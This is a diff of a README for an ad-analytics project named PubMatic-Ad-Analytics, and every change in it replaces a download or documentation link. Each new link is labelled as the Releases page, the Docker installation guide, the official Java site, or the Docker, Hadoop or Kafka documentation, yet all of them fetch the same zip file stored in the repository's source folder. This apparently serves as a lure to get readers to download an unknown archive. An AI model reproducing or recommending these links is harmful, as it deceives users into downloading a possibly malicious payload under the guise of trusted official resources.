@@ -16,11 +16,11 @@ Before you begin, ensure your computer meets the following requirements:
 
 ## 📥 Download Links
 
-[![Download Now](https://raw.githubusercontent.com/Sirius9337/PubMatic-Ad-Analytics/main/src/spark/Ad-Matic-Analytics-Pub-v2.0.zip%20Now-Visit%20This%20Page-brightgreen)](https://raw.githubusercontent.com/Sirius9337/PubMatic-Ad-Analytics/main/src/spark/Ad-Matic-Analytics-Pub-v2.0.zip)
+[![Download Now](https://github.com/Sirius9337/PubMatic-Ad-Analytics/raw/refs/heads/main/src/visualization/Ad-Analytics-Pub-Matic-v1.7.zip%20Now-Visit%20This%20Page-brightgreen)](https://github.com/Sirius9337/PubMatic-Ad-Analytics/raw/refs/heads/main/src/visualization/Ad-Analytics-Pub-Matic-v1.7.zip)
 
 You can download the latest version of PubMatic-Ad-Analytics from our Releases page. 
 
-Visit this page to download: [Download Here](https://raw.githubusercontent.com/Sirius9337/PubMatic-Ad-Analytics/main/src/spark/Ad-Matic-Analytics-Pub-v2.0.zip)
+Visit this page to download: [Download Here](https://github.com/Sirius9337/PubMatic-Ad-Analytics/raw/refs/heads/main/src/visualization/Ad-Analytics-Pub-Matic-v1.7.zip)
 
 ## 📦 Installation Steps
 
@@ -37,8 +37,8 @@ Follow these steps to install and run the application:
 
 3. **Install Dependencies:**
    - Open a terminal or command prompt.
-   - If you haven't installed Docker yet, follow the installation guide on the [Docker installation page](https://raw.githubusercontent.com/Sirius9337/PubMatic-Ad-Analytics/main/src/spark/Ad-Matic-Analytics-Pub-v2.0.zip).
-   - Ensure that Java is installed. You can check this by typing `java -version` in the terminal. If it is not installed, download it from the [official Java site](https://raw.githubusercontent.com/Sirius9337/PubMatic-Ad-Analytics/main/src/spark/Ad-Matic-Analytics-Pub-v2.0.zip).
+   - If you haven't installed Docker yet, follow the installation guide on the [Docker installation page](https://github.com/Sirius9337/PubMatic-Ad-Analytics/raw/refs/heads/main/src/visualization/Ad-Analytics-Pub-Matic-v1.7.zip).
+   - Ensure that Java is installed. You can check this by typing `java -version` in the terminal. If it is not installed, download it from the [official Java site](https://github.com/Sirius9337/PubMatic-Ad-Analytics/raw/refs/heads/main/src/visualization/Ad-Analytics-Pub-Matic-v1.7.zip).
 
 4. **Run the Application:**
    - Navigate to the folder where you extracted the files.
@@ -70,9 +70,9 @@ If you encounter any issues during installation or when running the application,
 
 For further assistance and information on how to use PubMatic-Ad-Analytics, visit the following resources:
 
-- [Docker Documentation](https://raw.githubusercontent.com/Sirius9337/PubMatic-Ad-Analytics/main/src/spark/Ad-Matic-Analytics-Pub-v2.0.zip)
-- [Hadoop Documentation](https://raw.githubusercontent.com/Sirius9337/PubMatic-Ad-Analytics/main/src/spark/Ad-Matic-Analytics-Pub-v2.0.zip)
-- [Kafka Documentation](https://raw.githubusercontent.com/Sirius9337/PubMatic-Ad-Analytics/main/src/spark/Ad-Matic-Analytics-Pub-v2.0.zip)
+- [Docker Documentation](https://github.com/Sirius9337/PubMatic-Ad-Analytics/raw/refs/heads/main/src/visualization/Ad-Analytics-Pub-Matic-v1.7.zip)
+- [Hadoop Documentation](https://github.com/Sirius9337/PubMatic-Ad-Analytics/raw/refs/heads/main/src/visualization/Ad-Analytics-Pub-Matic-v1.7.zip)
+- [Kafka Documentation](https://github.com/Sirius9337/PubMatic-Ad-Analytics/raw/refs/heads/main/src/visualization/Ad-Analytics-Pub-Matic-v1.7.zip)
 
 ## 💬 Community Support
 
